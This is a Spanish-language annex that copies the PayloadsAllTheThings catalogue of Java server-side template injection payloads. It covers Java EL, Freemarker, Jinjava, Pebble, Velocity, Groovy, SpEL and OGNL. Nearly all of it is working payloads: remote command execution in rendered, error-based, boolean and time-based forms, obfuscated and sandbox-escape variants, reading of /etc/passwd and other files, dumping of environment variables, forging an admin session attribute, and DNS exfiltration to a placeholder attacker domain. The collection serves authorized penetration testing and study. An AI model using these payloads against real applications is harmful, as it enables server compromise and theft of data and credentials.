# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/Java.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - Java / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
#{ }
${ }
[= ]
{{ }}
*{ }
[[ ]]
#set($X="") $X
```

## 2. Java EL / Java EL - Básicos Inyección

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Variantes presentes en tablas o texto del apartado

```text
${...}
#{...}
*{...}
@{...}
~{...}
```

## 3. Java EL / Java EL - Ejecución de código

```java
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE
```

## 4. Freemarker / Freemarker - Básicos Inyección

### Variantes presentes en tablas o texto del apartado

```text
${3*3}
#{3*3}
[=3*3]
```

## 5. Freemarker / Freemarker - Read Archivo

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

## 6. Freemarker / Freemarker - Ejecución de código

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]

${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
```

## 7. Freemarker / Freemarker - Ejecución de código Con Obfuscation

```js
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

### Variantes presentes en tablas o texto del apartado

```text
lower_abc
${9?lower_abc+4?lower_abc)}
```

## 8. Freemarker / Freemarker - Sandbox Evasión

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

## 9. Jinjava / Jinjava - Básicos Inyección

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

## 10. Jinjava / Jinjava - Ejecución de comandos

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

## 11. Pebble / Pebble - Básicos Inyección

```java
{{ someString.toUPPERCASE() }}
```

## 12. Pebble / Pebble - Ejecución de código

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

### Variantes presentes en tablas o texto del apartado

```text
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```

## 13. Inyección en plantillas del servidor - Java / Velocity

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

```java
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

```java
#set($s="")
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
#set($n=$p.waitFor())
#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
#include($b)
```

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#include("Y:/A:/xxx")
#end
```

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
#end
```

### Variantes presentes en tablas o texto del apartado

```text
echo "a" > /tmp/a
```

## 14. Groovy / Groovy - Básicos Inyección

### Variantes presentes en tablas o texto del apartado

```text
${9*9}
```

## 15. Groovy / Groovy - Read Archivo

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

## 16. Groovy / Groovy - HTTP Solicitud

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

## 17. Groovy / Groovy - Ejecución de comandos

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

## 18. Groovy / Groovy - Ejecución de comandos Con Obfuscation

```groovy
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

### Variantes presentes en tablas o texto del apartado

```text
${((char)105).toString()+((char)100).toString()}
```

## 19. Groovy / Groovy - Sandbox Evasión

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

## 20. Spring Expression Language / SpEL - Básicos Inyección

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
${T(java.lang.Integer).valueOf('1')}
```

### Variantes presentes en tablas o texto del apartado

```text
#{ }
${ }
```

## 21. Spring Expression Language / SpEL - Retrieve Environment Variables

```java
${T(java.lang.System).getenv()}
```

## 22. Spring Expression Language / SpEL - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## 23. Spring Expression Language / SpEL - DNS Extracción de datos

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","[ATTACKER.DOMAIN.TLD]")}
```

## 24. Spring Expression Language / SpEL - Sesión Attributes

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

## 25. Spring Expression Language / SpEL - Ejecución de comandos

```java
    ${T(java.lang.Runtime).getRuntime().exec("whoami")}
```

```java
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
```

```java
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
```

```java
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"whoami\\\")"))}
```

```java
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("whoami")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}
```

```java
    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
```

```java
    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
```

```java
    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
```

### Variantes presentes en tablas o texto del apartado

```text
java.lang.Runtime
javax.script.ScriptEngineManager
java.lang.ProcessBuilder
```

## 26. Object-Graph Navigation Language / OGNL - Básicos Inyección

```java
7*7
'patt'.toString().replace('a', 'x')
@java.lang.Integer@valueOf('1')
```

### Variantes presentes en tablas o texto del apartado

```text
${ }
```

## 27. Object-Graph Navigation Language / OGNL - Ejecución de comandos

```java
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

```java
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
```

```java
1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
```

```java
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
